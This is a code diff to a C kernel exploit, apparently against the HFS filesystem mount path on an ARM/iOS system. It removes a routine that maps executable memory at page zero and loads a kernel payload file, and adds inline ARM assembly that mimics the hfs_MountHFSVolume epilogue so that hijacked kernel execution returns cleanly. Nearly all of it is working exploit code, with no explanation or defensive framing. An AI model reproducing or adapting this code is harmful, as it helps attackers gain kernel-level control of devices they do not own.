@@ -26,21 +26,6 @@ struct hfs_mount_args {
     int       journal_disable;
 };
 
-int readfile(char *filename, void* buffer, unsigned int skip) {
-        FILE* file = fopen(filename, "rb");
-        if (file == NULL) {
-                printf("File %s not found.\n", filename);
-                return 1;
-        }
-        fseek(file, 0, SEEK_END);
-        int len = ftell(file);
-        fseek(file, skip, SEEK_SET);
-        fread(buffer, 1, len - skip, file);
-        fclose(file);
-
-        return len-skip;
-}
-
 void prepare_vndevice() {
 	struct vn_ioctl vn;
 
@@ -82,32 +67,26 @@ void mount_evil_hfs() {
 	}
 }
 
-void mmap_kernel_payload_page0() {
-	unsigned int *mmap_addr;
-	void* addr = (void *) 0x10000;
-	size_t length = 0x1000;
+void payload() {
+	// push	{r7, lr}
 
-	mmap_addr = mmap(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);	
-	printf("mmap ret addr : 0x%X\n", (unsigned int) mmap_addr);
+	asm (
+		// the compiler adds a push before the code, reverting the effect:
+		"add     sp, sp, #0x8\n\t"
 
-	if (mmap_addr != (unsigned int*) addr) {
-		printf("Can't mmap 0x%X page.\n", (unsigned int) addr);
-		exit(1);
-	}
+		// hfs_MountHFSVolume epilog:
+        	"add     sp, sp, #0xE4\n\t"
+        	"pop     {r2-r4}\n\t"
+        	"mov     r8, r2\n\t"
+        	"mov     r10, r3\n\t"
+		"mov     r11, r4\n\t"
+		"pop     {r4-r7,pc}"
+	);
 
-	readfile("kpayload.bin", mmap_addr, 0);
-
-	int ret = mprotect(addr, length, PROT_READ|PROT_EXEC);
-	printf("mprotect ret code : 0x%X\n", ret);
-
-	if (ret!=0) {
-		printf("mprotect failed.\n");
-		exit(1);
-	}
+	// pop	{r7, pc}
 }
 
 int main(int argc, char* argv[]) {
 	prepare_vndevice();
-	mmap_kernel_payload_page0();
 	mount_evil_hfs();
 }
